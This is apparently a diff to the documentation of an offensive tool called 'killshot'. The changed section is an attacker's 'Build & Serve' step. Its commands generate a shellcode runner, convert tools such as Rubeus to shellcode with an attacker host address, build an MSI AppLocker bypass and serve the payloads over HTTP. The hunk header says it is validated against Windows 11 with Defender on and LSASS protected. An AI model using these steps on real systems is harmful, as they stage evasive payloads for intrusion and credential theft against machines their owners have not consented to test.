@@ -327,14 +327,20 @@ Validated: Windows 11 24H2, Defender real-time ON, LSASS RunAsPPL=2.
 ### Step 1 — Attacker: Build & Serve
 
 ```bash
-# 1a. Compile a fresh runner (randomizes symbols each build)
-python3 gen_runner.py --injection create_thread -o /workspace/killshot/runner_ct32.dat
+# 1a. Generate runner + all tool shellcodes in one command
+killshot generate --runner --tools -l 10.99.0.16
 
-# 1b. Generate all tool shellcodes at once
-python3 killshot.py --all --lhost 10.99.0.16 -w /workspace/killshot/
+# 1b. Start HTTP server
+killshot serve 8888
+```
 
-# 1c. Start HTTP server
-cd /workspace/killshot && python3 -m http.server 8888
+Or generate individual components:
+```bash
+killshot generate --runner            # Just runner.exe + runner.dat
+killshot generate --tools -l 10.99.0.16  # All tools to shellcode
+killshot generate --tool Rubeus       # Single tool
+killshot generate --msi               # MSI AppLocker bypass
+killshot serve                        # HTTP server (default port 8000)
 ```
 
 ---
